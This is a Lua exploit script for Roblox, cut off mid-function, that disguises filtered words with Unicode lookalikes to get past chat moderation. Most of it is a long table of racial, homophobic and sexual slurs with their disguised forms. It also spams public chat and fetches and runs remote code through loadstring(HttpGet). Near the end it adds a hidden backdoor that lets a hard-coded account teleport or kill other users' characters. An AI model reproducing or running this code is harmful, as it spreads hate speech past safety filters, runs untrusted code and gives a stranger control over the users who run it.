if game:GetService("CoreGui"):FindFirstChild("AnnaBypasser") then
	print("AnnaBypasser already loaded")
	game:GetService("CoreGui"):FindFirstChild("AnnaBypasser"):Destroy()
end

if _G.NiggerSex ~= "fagnigger6" then
	pcall(function()
		Game.Players:chat("AnnaBypasser Loaded")
		Game.Players:chat("EEEEEEEEEEEEE")
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("AnnaBypasser\8Loaded\8Made\8By\8Anna\8- guilded.gg/u/AnnaBlox\8rebrand.ly/AnnaBypasser -\8updates:\8https://disِcord.gg/VrSHuQQBPh", "All")
	end)
end

print("AnnaBypasser Loaded")
print("updated 8/20/2025")
print("press right ctrl to toggle gui")
print("press ether slash key to focus on gui")
print("filter check pre filters your message to block filtered msgs from chat")

local ScreenGui = Instance.new("ScreenGui")

ScreenGui.Name = "AnnaBypasser"

local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")
local TextBox2 = Instance.new("TextBox")
local TextButton2 = Instance.new("TextButton")
local _ = game:GetService("Players").LocalPlayer

ScreenGui.Parent = game.CoreGui
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Frame.Position = UDim2.new(0.7, 35, 0.7, -100)
Frame.Size = UDim2.new(0, 300, 0, 200)
ImageLabel.Size = UDim2.new(1, 0, 0.4, 0)
ImageLabel.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
ImageLabel.Position = UDim2.new(0, 0, -0.3, 0)
ImageLabel.Image = "rbxassetid://84482790380175"
ImageLabel.Parent = Frame

local UserInputService = game:GetService("UserInputService")
local u10 = nil
local Position = nil
local Position2 = nil

local function v13(p1)
	local v14 = p1.Position - Position

	Frame.Position = UDim2.new(Position2.X.Scale, Position2.X.Offset + v14.X, Position2.Y.Scale, Position2.Y.Offset + v14.Y)
end

Frame.InputBegan:Connect(function(input)
	if not (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
		return
	end

	u10 = true
	Position = input.Position
	Position2 = Frame.Position
	input.Changed:Connect(function()
		if input.UserInputState ~= Enum.UserInputState.End then
			return
		end

		u10 = false
	end)
end)
Frame.InputChanged:Connect(function(input)
	if not ((input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and u10) then
		return
	end

	v13(input)
end)
ImageLabel.InputBegan:Connect(function(input)
	if not (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
		return
	end

	u10 = true
	Position = input.Position
	Position2 = Frame.Position
	input.Changed:Connect(function()
		if input.UserInputState ~= Enum.UserInputState.End then
			return
		end

		u10 = false
	end)
end)
ImageLabel.InputChanged:Connect(function(input)
	if not ((input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and u10) then
		return
	end

	v13(input)
end)
TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TextBox.Position = UDim2.new(0.05, 0, 0.05, 0)
TextBox.Size = UDim2.new(0.9, 0, 0.3, 0)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = "Enter text here"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 255, 0)
TextBox.TextSize = 14
TextBox.ClearTextOnFocus = true
TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
TextButton.Position = UDim2.new(0.25, 0, 0.4, 0)
TextButton.Size = UDim2.new(0.5, 0, 0.15, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Bypass Text"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14
TextBox2.Parent = Frame
TextBox2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TextBox2.Position = UDim2.new(0.05, 0, 0.6, 0)
TextBox2.Size = UDim2.new(0.9, 0, 0.35, 0)
TextBox2.Font = Enum.Font.SourceSans
TextBox2.Text = "Bypassed text will appear here"
TextBox2.TextColor3 = Color3.fromRGB(0, 255, 0)
TextBox2.TextSize = 14
TextBox2.TextWrapped = true

local TextLabel = Instance.new("TextLabel")

TextLabel.Parent = Frame
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(0.05, 0, 0.36, 0)
TextLabel.Size = UDim2.new(0.15, 0, 0.05, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Filter Check"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14

local Frame2 = Instance.new("Frame")

Frame2.Parent = Frame
Frame2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Frame2.Position = UDim2.new(0.05, 0, 0.43, 0)
Frame2.Size = UDim2.new(0.15, 0, 0.15, 0)

local TextLabel2 = Instance.new("TextLabel")

TextLabel2.Parent = Frame2
TextLabel2.BackgroundTransparency = 1
TextLabel2.Size = UDim2.new(1, 0, 1, 0)
TextLabel2.Font = Enum.Font.SourceSansBold
TextLabel2.Text = "X"
TextLabel2.TextColor3 = Color3.fromRGB(0, 255, 0)
TextLabel2.TextSize = 24

local u18 = false

Frame2.InputBegan:Connect(function(input)
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then
		return
	end

	u18 = not u18
	TextLabel2.Text = u18 and "" or "X"
	Frame2.BackgroundColor3 = u18 and Color3.fromRGB(60, 60, 60) or Color3.fromRGB(40, 40, 40)
end)

local u19 = false

TextButton2.MouseButton1Click:Connect(function()
	u19 = not u19
	TextButton2.BackgroundColor3 = u19 and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(100, 0, 0)
end)

local function v20()
	local s1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	local s2 = ""

	for _ = 1, math.random(80, 90) do
		local v24 = math.random(1, #s1)

		s2 = s2 .. string.sub(s1, v24, v24)
	end

	return s2
end
local function v25(p2)
	if not (u19 or u18) then
		return
	end

	for _ = 1, 8 do
		local v27 = v20()

		pcall(function()
			Game.Players:Chat((p2 .. " " or "(eee) ") .. v27)
		end)
	end
end

local t1 = {
	america = "america",
	AMERICA = "AMERICA",
	America = "America",
	anal = "аnаӏ",
	ANAL = "АΝАL",
	Anna = "Anna",
	anti = "anti",
	ANTI = "ANTI",
	ASS = "ASS",
	ass = "aธธ",
	asses = "aธธes",
	ASSES = "ASSES",
	asshole = "aธธhoӏe",
	assholes = "aธธhoӏeѕ",
	ASSHOLE = "AِЅЅНОLЕ",
	ASSHOLES = "AِЅЅНОLЕS",
	al = "al",
	bastard = "ხastard",
	BASTARD = "BAჽTARD",
	Bastard = "ხastard",
	bdsm = "bdธm",
	BDSM = "BDჽM",
	beaner = "beaⴖer",
	BEANER = "BEANER",
	bisexual = "biธexual",
	BISEXUAL = "BIჽEXUAL",
	black = "bӏack",
	bitch = "ხitch",
	bitches = "ხitches",
	BITCHES = "BITCHES",
	BITCH = "ხITCH",
	blox = "blox",
	blowjob = "bӏowjoხ",
	blowjobs = "bӏowjoხs",
	BLOWJOB = "В〪LOWJОВ",
	bondage = "boⴖdage",
	BONDAGE = "ხONDAGE",
	boob = "ხооხ",
	boobies = "ხооხies",
	boobs = "ხооხs",
	BOOBS = "BООВЅ",
	BOOB = "BООВ",
	booty = "ხooty",
	BOOTY = "BООTY",
	bong = "boⴖg",
	BONG = "BONG",
	boner = "boⴖer",
	Boner = "Boⴖer",
	BONER = "BONER",
	breast = "breaธt",
	breasts = "breaธtธ",
	breed = "breed",
	bypass = "bypass",
	brazz = "braⴭⴭ",
	BRAZZ = "BRAჍჍ",
	call = "call",
	chong = "choⴖg",
	coochie = "coochı۬e",
	Coochie = "Coochı۬e",
	cocaine = "cocaı۬ne",
	childfucker = "childfษcker",
	CHILDFUCKER = "CHILDꜰUCKER",
	chink = "chink",
	CHINK = "CHINK",
	clit = "cӏit",
	CLIT = "CLlT",
	commie = "commie",
	commies = "commies",
	COMMIE = "COMMIE",
	COMMIES = "COMMIES",
	cock = "c۬۬۬۬۬۬oc۬۬۬۬۬۬k",
	COCK = "ᲃОСK",
	Cock = "ᲃосk",
	cocksuck = "c۬۬۬۬۬۬oc۬۬۬۬۬۬ksِuck",
	COCKSUCK = "ᲃОСKႽUCK",
	cocksucker = "cׂׂׂׂocksِucker",
	COCKSUCKER = "ᲃОСKSِUСKЕR",
	condom = "coⴖdom",
	consent = "conธent",
	consented = "conธented",
	CONDOM = "ᲃONDOM",
	CONSENT = "ᲃONSENT",
	CONSENTED = "ᲃONSENTED",
	coon = "coon",
	crack = "crack",
	creampie = "creampı۬e",
	Creampie = "ᲃreampie",
	CREAMPIE = "ᲃREAMPIE",
	cuck = "cษck",
	Cuck = "Cษck",
	CUCK = "ᲃUᲃK",
	cum = "cษm",
	CUM = "ᲃUM",
	cumming = "cษmming",
	CUMMING = "ᲃUMMING",
	cumslut = "cษmsӏut",
	CUMSLUT = "ᲃUMჽLUT",
	cunt = "cuⴖt",
	cunnie = "cuⴖⴖie",
	CUNNIE = "ᲃUNNIE",
	cunts = "cuⴖts",
	CUNT = "ᲃUNT",
	chair = "chair",
	ching = "ching",
	deepthroat = "deepthroสt",
	DEEPTHROAT = "ÐEEPTHROAT",
	deadass = "dِeadass",
	dirty = "dirty",
	DIRTY = "DIRTY",
	dildo = "diӏdo",
	DILDO = "ÐILDO",
	DICK = "ÐIᲃK",
	dick = "dׂׂׂick",
	dogfucker = "dogfษcker",
	DOGFUCKER = "DOGꜰUCKER",
	drug = "drug",
	drunk = "drษnk",
	discord = "diธcord",
	DISCORD = "ÐISCORD",
	drugs = "drษgธ",
	DRUG = "DRUG",
	DRUGS = "ÐRUGS",
	dumbass = "dษmbaธธ",
	DUMBASS = "ÐUMBASS",
	email = "emaiӏ",
	erection = "erectioⴖ",
	Erection = "Erectioⴖ",
	fagg = "fสgg",
	fag = "fสg",
	Fagg = "ꜰสggot",
	faggot = "fสḡḡot",
	Faggot = "ꜰaggot",
	FAGGOT = "ꜰAGGOT",
	faggots = "fِaggots",
	FAGGOTS = "ꜰAGGOTS",
	fags = "fสgs",
	fatass = "fِatass",
	Fat = "ꜰat",
	FAT = "ꜰAT",
	Fatass = "Fِataธธ",
	fatasses = "fataธธes",
	FATASS = "ꜰATASS",
	fi = "fi",
	FI = "FI",
	fl = "fl",
	FUCK = "ꜰUCK",
	fuck = "fษck",
	Fuck = "ꜰuck",
	fucking = "fษсkіng",
	FUCKING = "ꜰUCKING",
	fuckable = "fษckable",
	FUCKABLE = "ꜰUCKABLE",
	fuckboy = "fษckboy",
	Fuckboy = "ꜰuckboy",
	FUCKBOY = "ꜰUCKBOY",
	fucked = "fษcked",
	fucker = "fษcker",
	fucks = "fษcks",
	Fucked = "ꜰucked",
	Fucker = "ꜰucker",
	Fucks = "ꜰucks",
	FUCKED = "ꜰUCKED",
	FUCKER = "ꜰUCKER",
	FUCKS = "ꜰUCKS",
	fucktard = "fษcktard",
	Fucktard = "ꜰucktard",
	FUCKTARD = "ꜰUCKTARD",
	fucktoy = "fษcktoy",
	FUCKTOY = "ꜰUCKTOY",
	Fucktoy = "ꜰucktoy",
	give = "give",
	girl = "girӏ",
	Girl = "Girӏ",
	GIRL = "GIRL",
	grop = "gꞅop",
	GROP = "GׅROP",
	Grop = "Gꞅop",
	gender = "geⴖder",
	Gender = "Geⴖder",
	genocide = "geⴖocide",
	Genocide = "Geⴖocide",
	google = "googӏe",
	Google = "Googӏe",
	have = "have",
	handjob = "haⴖdjob",
	heil = "heiӏ",
	hentai = "heⴖtaı۬",
	Hentai = "Heⴖtaı۬",
	HENTAI = "HِENTAl",
	Heil = "heı۬ӏ",
	HEIL = "HEIL",
	hitler = "һı۬tӏег",
	Hitler = "Hı۬tӏег",
	HEIL = "HِEIL",
	HITLER = "HِITLER",
	holocaust = "holocauธt",
	HOE = "HOE",
	hoe = "hoe",
	holy = "holy",
	homosexual = "homoธexual",
	Homosexual = "Homoธexual",
	hooker = "hookeꞅ",
	horny = "horⴖy",
	Hooker = "Hookeꞅ",
	Horny = "Horⴖy",
	HOMOSEXUAL = "HOMOธexUAL",
	HOOKER = "HِOOKER",
	HORNY = "HِORNY",
	instagram = "inธtagram",
	INSTAGRAM = "IِNSTAGRAM",
	isis = "iِsِiِsِ",
	im = "im",
	ip = "ip",
	IP = "IP",
	id = "id",
	il = "il",
	is = "is",
	le = "le",
	ig = "ig",
	iv = "iv",
	ie = "ie",
	ll = "ll",
	ir = "ir",
	ii = "ii",
	ly = "ly",
	lo = "lo",
	im = "im",
	IM = "IM",
	ld = "ld",
	ft = "ft",
	ic = "ic",
	ix = "ix",
	INE = "INE",
	ING = "ING",
	jesus = "jesus",
	Jesus = "Jesus",
	jackass = "jackaธธ",
	JACKASS = "JِACKASS",
	jungle = "jungӏe",
	jew = "jew",
	jews = "jews",
	jerking = "jِerking",
	JERKMATE = "JِERKMATE",
	job = "jِob",
	jig = "jı۬g",
	jigaboo = "jِigaboo",
	jiggaboo = "jِiggaboo",
	Jig = "Jِig",
	kkk = "kkk",
	KKK = "KKK",
	kys = "kys",
	kill = "kı۬ll",
	Kill = "ᴋı۬ll",
	KILL = "KِILL",
	killing = "kı۬lling",
	killed = "kiӏӏed",
	KILLING = "KILLING",
	KILLED = "KِILLED",
	knife = "knife",
	KNIFE = "KNIFE",
	kiss = "kiss",
	kissing = "kı۬ssing",
	KISS = "KISS",
	KISSING = "KISSING",
	kinky = "kiⴖky",
	kike = "kı۬ke",
	KINKY = "Kiⴖky",
	lap = "ӏap",
	LMAO = "LMAO",
	lmao = "ӏmao",
	love = "ӏove",
	like = "like",
	LIKE = "LIKE",
	luck = "luck",
	lust = "ӏust",
	LUST = "LِUST",
	Lust = "Lษst",
	liberal = "liberal",
	LIBERAL = "LIBERAL",
	Liberal = "Liberal",
	lsd = "ӏsd",
	LSD = "LِSD",
	lgbtq = "ӏgbtq",
	masturbate = "maธturbate",
	Masturbate = "Maธturbate",
	mexican = "mexican",
	MEXICAN = "MEXICAN",
	myass = "my\8aธธ",
	MYASS = "MY\8AِSS",
	mississippi = "mississippi",
	MISSISSIPPI = "MISSISSIPPI",
	milf = "miӏf",
	Milf = "Miӏf",
	molest = "moleธt",
	Molest = "Moleธt",
	MOLEST = "MOLEჽT",
	motherfucker = "motherfษcker",
	Motherfucker = "Motherfษcker",
	motherfucking = "motherfษcking",
	MOTHERFUCKER = "MOTHERꜰUCKER",
	MOTHERFUCKING = "MOTHERꜰUCKING",
	naked = "ⴖaked",
	Naked = "Nِaked",
	nazi = "naⴭi",
	NAZI = "NAჍI",
	negro = "ⴖegro",
	Negro = "Nِegro",
	negrophobia = "ⴖegrophobia",
	negroes = "ⴖegroes",
	NAKED = "NِAKED",
	NEGRO = "NِEGRO",
	NEGROES = "NِEGROES",
	nice = "nice",
	NICE = "NICE",
	NIGGA = "NlGGA",
	Nigga = "Nِigga",
	nig = "ⴖῘg",
	niger = "ⴖῘger",
	nigeria = "ⴖῘgeria",
	niglet = "ⴖiglet",
	niglets = "ⴖigletѕ",
	nigg = "ⴖῘgg",
	Nigg = "Nِigg",
	NIGG = "NِIGG",
	nigga = "ⴖiggส",
	niggas = "ⴖiggสธ",
	niggers = "ⴖῘggeꞅธ",
	nigger = "ⴖῘggeꞅ",
	NIGGER = "NِIGGER",
	NIGGERS = "NِِIGGERS",
	NiggerSex = "Nِiggerჽex",
	nsfw = "ⴖsfw",
	Nsfw = "Nِsfw",
	nude = "ⴖude",
	Nude = "Nِude",
	nudes = "ⴖudes",
	Nudes = "Nِudes",
	NSFW = "NِSFW",
	NUDE = "NِUDE",
	NUDES = "ΝِUDES",
	orgy = "oꞅgy",
	ORGY = "OِRGY",
	panties = "paⴖties",
	Panties = "Paⴖties",
	penis = "peniธ",
	PENIS = "PENIჽ",
	PORNHUB = "PِORNHUB",
	PORN = "PِORN",
	Porn = "Porⴖ",
	power = "pِower",
	POWER = "PِOWER",
	pussy = "puธธy",
	Pussy = "Puธธy",
	PUSSY = "PUჽჽY",
	prostitute = "proธtitute",
	PROSTITUTE = "PِِROSTITUTE",
	pick = "pick",
	phile = "phı۬ӏe",
	pedophile = "pedophı۬ӏe",
	racist = "racist",
	rape = "rสре",
	Rape = "Rสре",
	RAPE = "RАРЕ",
	raped = "rสpеd",
	Raped = "rสpеd",
	RAPED = "RАPЕD",
	raping = "rapiⴖg",
	rapist = "rapiธt",
	rapists = "rapiธtѕ",
	RAPIST = "RАPӀЅТ",
	Raping = "Rapiⴖg",
	Rapist = "Rapiธt",
	raghead = "rสghead",
	Raghead = "Rِaghead",
	RAGHEAD = "RِAGHEAD",
	redskin = "redskiⴖ",
	Redskin = "Redskiⴖ",
	retard = "rеtสrd",
	RETARD = "RِِETARD",
	roblox = "roblox",
	republican = "republican",
	Republican = "Republican",
	says = "sِays",
	Says = "Sِays",
	SAYS = "SِAYS",
	script = "script",
	semen = "semeⴖ",
	Semen = "Semeⴖ",
	SEMEN = "ჽEMEN",
	seduc = "sِeduc",
	Seduced = "ჽeduc",
	SEDUC = "SEDUC",
	sex = "ธex",
	Sex = "ჽex",
	SEX = "ჽEX",
	sexist = "ธexist",
	sext = "ธext",
	sextoy = "ธextoy",
	sexual = "ธexual",
	sexy = "ธexy",
	sexdoll = "ธexdoll",
	Sexdoll = "ธexdoll",
	shit = "ธhit",
	Shit = "ჽhit",
	SHIT = "ჽНӀТ",
	should = "should",
	shot = "sِhot",
	Shot = "ჽhot",
	spic = "sِpic",
	Spic = "spı۬c",
	SPIC = "ჽPIC",
	SIEG = "SIEG",
	SLAVE = "ჽLAVE",
	slave = "ธӏave",
	SLAVERY = "ჽLAVERY",
	SLAVES = "ჽLAVES",
	Slave = "Sӏave",
	slur = "ѕlur",
	slut = "ѕӏut",
	SLUT = "ჽLUT",
	Slut = "Ѕӏut",
	strip = "ธtrip",
	STRIP = "ჽTRIP",
	sucker = "sษcker",
	Sucker = "Sษcker",
	SUCKER = "ჽUCKER",
	SUCKING = "SUCKING",
	snapchat = "sⴖapchat",
	Snapchat = "Sⴖapchat",
	sperm = "ธperm",
	Sperm = "ჽperm",
	sperms = "ธperms",
	SNAPCHAT = "ჽNAPCHAT",
	SPERM = "ჽPERM",
	stupid = "ธtupid",
	suicide = "ธuicide",
	TARD = "TِARD",
	terrorist = "terroriธt",
	terrorism = "terroriธm",
	this = "thiธ",
	THIS = "THIჽ",
	threesome = "threeธome",
	Threesome = "Threeธome",
	THREESOME = "THREEჽOME",
	thong = "thoⴖg",
	tits = "tı۬tธ",
	titt = "tı۬tt",
	titties = "tı۬tties",
	TITTIES = "TِITTIES",
	Titt = "Tı۬tt",
	Tits = "Tı۬tธ",
	tiktok = "tiktok",
	TONIGHT = "TONIGHT",
	tranny = "trสnny",
	trannie = "trannı۬e",
	TRANNY = "TِRANNY",
	TRANNIE = "TRANNlE",
	TRUMP = "TRUMР",
	trump = "trumр",
	twat = "twสt",
	Twat = "Tِwat",
	TWAT = "ِTِWAT",
	twink = "twiⴖk",
	twinks = "twinks",
	vagina = "vagiⴖa",
	Vagina = "Vagiⴖa",
	weed = "wِeed",
	Weed = "Wِeed",
	WEED = "WِEED",
	well = "well",
	wetback = "wِetbสck",
	Wetback = "Wِetback",
	WETBACK = "WِETBACK",
	whore = "พฺhore",
	Whore = "Wِhore",
	whores = "wِhores",
	Whores = "Wِhores",
	WHORE = "WِHORE",
	white = "wһіtе",
	White = "Wһіtе",
	xxx = "ӽӽӽ",
	XXX = "XِXِXِ",
	youtube = "youtษbe",
	YOUTUBE = "YِOUTUBE",
	Youtube = "Youtษbe",
	your = "yoษr",
	Your = "Yoษr",
	zoophile = "zoophı۬Ie"
}

local function v29(p3)
	return p3:gsub("i", "ı۬")
end
local function v30(p4)
	return p4:gsub("xxx", "ӽӽӽ")
end
local function v31(p5)
	return p5:gsub("l", "ӏ")
end
local function v32(p6)
	return p6:gsub("I", "I")
end
local function v33(p7)
	return p7:gsub("rape", "rสре")
end
local function v34(p8)
	return p8:gsub("RAPE", "RАРЕ")
end
local function v35(p9)
	return p9:gsub("porn", "porⴖ")
end
local function v36(p10)
	return p10:gsub("sex", "ธex")
end
local function v37(p11)
	return p11:gsub("cums", "cษms")
end
local function v38(p12)
	return p12:gsub("cum", "cษm")
end
local function v39(p13)
	return p13:gsub("faggot", "fสggot")
end
local function v40(p14)
	return p14:gsub("cock", "cِосk")
end
local function v41(p15)
	return p15:gsub("fuck", "fษck")
end
local function v42(p16)
	return p16:gsub("tard", "tِard")
end
local function v43(p17)
	return p17:gsub("in", "in")
end
local function v44(p18)
	return p18:gsub("ing", "ing")
end
local function v45(p19)
	return p19:gsub("ith", "ith")
end
local function v46(p20)
	return p20:gsub("it", "it")
end

local t2 = {
	g = "g",
	i = "ı۬",
	j = "jِ",
	l = "l",
	y = "y",
	I = "l"
}

local function v48(p21)
	local v49 = p21:gsub("[%p%c%s]", "")
	local v50, v51, v52 = p21:gmatch("[%p%c%s]")
	local t3 = {}

	while true do
		v52 = v50(v51, v52)

		if v52 == nil then
			break
		end

		table.insert(t3, v52)
	end

	if t1[v49] then
		local match = p21:match("^([%p%c%s]*)")
		local match2 = p21:match("([%p%c%s]*)$")

		return match .. t1[v49] .. match2
	end

	for k in pairs(t1) do
		if v49:find(k) then
			return p21:gsub(k, t1[k])
		end
	end

	if #v49 >= 4 then
		if p21:find("rape") then
			return v33(p21)
		elseif p21:find("RAPE") then
			return v34(p21)
		elseif p21:find("ith") then
			return v45(p21)
		elseif p21:find("ing") then
			return v44(p21)
		elseif p21:find("tard") then
			return v42(p21)
		elseif p21:find("it") then
			return v46(p21)
		elseif p21:find("in") then
			return v43(p21)
		elseif p21:find("i") then
			return v29(p21)
		elseif p21:find("xxx") then
			return v30(p21)
		elseif p21:find("l") then
			return v31(p21)
		elseif p21:find("I") then
			return v32(p21)
		elseif p21:find("porn") then
			return v35(p21)
		elseif p21:find("sex") then
			return v36(p21)
		elseif p21:find("cums") then
			return v37(p21)
		elseif p21:find("cum") then
			return v38(p21)
		elseif p21:find("faggot") then
			return v39(p21)
		elseif p21:find("cock") then
			return v40(p21)
		elseif p21:find("fuck") then
			return v41(p21)
		else
			local v57 = p21:sub(1, 1)
			local v58 = p21:sub(2)

			return (t2[v57] or v57) .. v58
		end
	else
		return p21
	end
end
local function v59()
	local v60, v61, v62 = TextBox.Text:gmatch("%S+")
	local t4 = {}
	local text = ""
	local n1 = 0

	while true do
		v62 = v60(v61, v62)

		if v62 == nil then
			break
		end

		table.insert(t4, v62)
	end

	for i, v in ipairs(t4) do
		text = text .. v48(v)
		n1 = n1 + 1

		if i < #t4 then
			if n1 % 7 ~= 0 or i >= #t4 - 1 then
				text = text .. "\8"
			else
				text = text .. " "
			end
		end
	end

	TextBox2.Text = text

	return text
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function v70(p22)
	local v71 = game:GetService("Chat"):FilterStringAsync(p22, LocalPlayer, LocalPlayer)

	return v71 == p22, v71
end
local function v72(p23)
	if p23:sub(1, 2) ~= "/e" and p23:sub(1, 2) ~= "\\e" then
		local v73 = v59(p23)
		local ok, result = pcall(function()
			return v70(v73)
		end)

		if not ok then
			TextBox2.Text = "Error filtering message"
			TextBox2.TextColor3 = Color3.fromRGB(255, 0, 0)

			return
		end

		if u18 then
			if result then
				if not previewMode then
					pcall(function()
						v25("AntiTags - AnnaBypasser")
						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v73, "All")
						task.wait(1)
						v25("AntiTags - AnnaBypasser")
					end)
				end

				pcall(function()
					game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(v73)
				end)
				TextBox2.Text = v73
				TextBox2.TextColor3 = Color3.fromRGB(0, 255, 0)
			else
				TextBox2.Text = "Text Filtered: resetting filter"
				TextBox2.TextColor3 = Color3.fromRGB(255, 0, 0)
				v25("AntiTags - AnnaBypasser")
			end
		else
			if not previewMode then
				pcall(function()
					v25()
					workspace.Main.Chatted:FireServer(v73)
				end)
				v25()
			end

			pcall(function()
				v25("Anti Tags - AnnaBypasser")
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v73, "All")
				task.wait(1)
				v25("Anti Tags - AnnaBypasser")
			end)
			pcall(function()
				game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(v73)
			end)
			TextBox2.Text = v73
			TextBox2.TextColor3 = Color3.fromRGB(0, 255, 0)
		end

		return
	end

	if p23:sub(1, 2) ~= "\\e" then
		game.Players:Chat(p23)

		return
	end

	p23 = "/e" .. p23:sub(3)
	game.Players:Chat(p23)
end

TextBox.FocusLost:Connect(function(enterPressed)
	if not enterPressed then
		return
	end

	v72(TextBox.Text)
end)
TextButton.MouseButton1Click:Connect(function()
	v72(TextBox.Text)
end)

local function toggleEnabled()
	ScreenGui.Enabled = not ScreenGui.Enabled
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed or input.KeyCode ~= Enum.KeyCode.RightControl then
		return
	end

	toggleEnabled()
end)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed or input.KeyCode ~= Enum.KeyCode.Slash and input.KeyCode ~= Enum.KeyCode.BackSlash then
		return
	end

	wait(0)
	TextBox.Text = ""
	TextBox:CaptureFocus()
end)

local t5 = {}

local function v79(p24)
	local ScreenGui2 = Instance.new("ScreenGui")
	local TextLabel3 = Instance.new("TextLabel")

	ScreenGui2.Parent = LocalPlayer:WaitForChild("PlayerGui")
	TextLabel3.Size = UDim2.new(0.5, 0, 0.1, 0)
	TextLabel3.Position = UDim2.new(0.25, 0, 0.45, 0)
	TextLabel3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel3.TextColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel3.Text = p24
	TextLabel3.Parent = ScreenGui2
	wait(7)
	ScreenGui2:Destroy()
end
local function v82(p25)
	if t5[p25] then
		return
	end

	local v83 = Players:FindFirstChild(p25)

	if not v83 then
		return
	end

	t5[p25] = true
	v79("script creator is in game!" .. " - " .. v83.Name)
	pcall(function()
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("script creator is in game!" .. " - " .. v83.Name, "All")
	end)
	pcall(function()
		game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("script creator is in game!" .. " - " .. v83.Name)
	end)
end
local function v84()
	local DefaultChatSystemChatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")

	if DefaultChatSystemChatEvents then
		if DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest") then
			return
		end

		v79("SayMessageRequest is missing! Please note that antilogger might not work properly.")
	else
		v79("textchatservice detected antilogger wont work here use at your own risk")
	end
end

v84()
v84()
loadstring(game:HttpGet("https://raw.githubusercontent.com/joshclark756/joshclark756-s-scripts/refs/heads/main/reset%20filter.lua", true))()

local function v86(p26)
	local ok, result = pcall(function()
		return game:GetService("Chat"):FilterStringAsync(p26, LocalPlayer, LocalPlayer)
	end)

	if not ok then
		return ok, result
	end

	ok = result == p26

	return ok, result
end
local function v89(p27)
	local v90 = v86(p27)

	if v90 then
		if not v90 then
			return
		end

		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "AnnaBypasser Loaded Successfully!",
			Color = Color3.fromRGB(0, 255, 0),
			Font = Enum.Font.SourceSans,
			TextSize = 20
		})
	else
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "error checking filter make sure your language is set to Қазақ Тілі* if you dont know how watch youtube.com/watch?v=Y-WpfOQiboU",
			Color = Color3.fromRGB(255, 0, 0),
			Font = Enum.Font.SourceSans,
			TextSize = 20
		})
	end
end

(function()
	v89("lil\8hoe")
end)()

local Players2 = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local s3 = ";annabypasser"
local s4 = "in\8aⴖⴖa\8we\8trust"
local t6 = {}

local function v97(p28)
	StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = p28,
		Color = Color3.fromRGB(255, 255, 255),
		Font = Enum.Font.SourceSansBold,
		FontSize = Enum.FontSize.Size24
	})
end
local function v98(p29)
	if not p29 then
		return
	end

	p29.Chatted:Connect(function(message)
		if message == s3 then
			Players2:Chat(s4)

			if p29 == Players2.LocalPlayer then
				v97("These players are using annabypasser: " .. table.concat(t6, ", "))
			end
		end

		if not ((message:lower() == s4 or message:match("^#+$") and #message == #s4) and not table.find(t6, p29.Name)) then
			return
		end

		table.insert(t6, p29.Name)
	end)
end

local v99 = Players2
local v100, v101, v102 = ipairs(Players2.GetPlayers(v99))
local v103 = Players2

while true do
	local v104

	v102, v104 = v100(v101, v102)

	if v102 == nil then
		break
	end

	v98(v104)
end

v103.PlayerAdded:Connect(function(player)
	v98(player)
end)

local Players3 = game:GetService("Players")
local LocalPlayer2 = Players3.LocalPlayer
local s5 = "annathegoodgirI"

local function v108(p30, p31)
	if p30.Name ~= s5 then
		return
	end

	local parts = p31:split(" ")
	local v110 = parts[1]:lower()
	local HumanoidRootPart

	if v110 == ".tpa" or v110 == ".tp" then
		if not (p30.Character and p30.Character:FindFirstChild("HumanoidRootPart")) then
			return
		end

		HumanoidRootPart = p30.Character:FindFirstChild("HumanoidRootPart")
	else
		HumanoidRootPart = nil
	end

	if v110 == ".tpa" then
		if not (LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("HumanoidRootPart")) then
			return
		end

		LocalPlayer2.Character:FindFirstChild("HumanoidRootPart").CFrame = HumanoidRootPart.CFrame * CFrame.new(0, 0, 5)
	elseif v110 == ".kill" then
		if not parts[2] then
